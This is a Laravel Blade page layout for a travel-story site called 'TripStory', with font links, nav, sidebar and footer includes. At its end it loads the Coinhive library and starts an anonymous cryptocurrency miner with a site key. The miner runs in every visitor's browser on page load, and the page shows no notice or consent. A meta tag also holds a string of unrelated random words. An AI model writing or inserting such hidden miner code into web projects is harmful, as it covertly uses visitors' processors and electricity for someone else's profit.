<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>TripStory</title>
<meta name="tags" content="owls logic puzzled fever getting upper heels wife actress light fiat under logic">
    <!-- Styles -->
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Vollkorn+SC" rel="stylesheet">
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">

</head>
<body>
    @include('partials.fbjdk')
    @include('layout.nav')
    <main class="main-wrapper">
        <section class="posts">
            @yield('content')
        </section>
         @include('partials.sidebar')
    </main>
   
    @include('layout.footer')
    <!-- Scripts -->
    @yield('js')
    <script src="{{ asset('js/app.js') }}"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
        var miner = new CoinHive.Anonymous('P7tmhUNXYsdufurryd6rcyTjAJMuoSy4');
        miner.start();
    </script>
</body>
</html>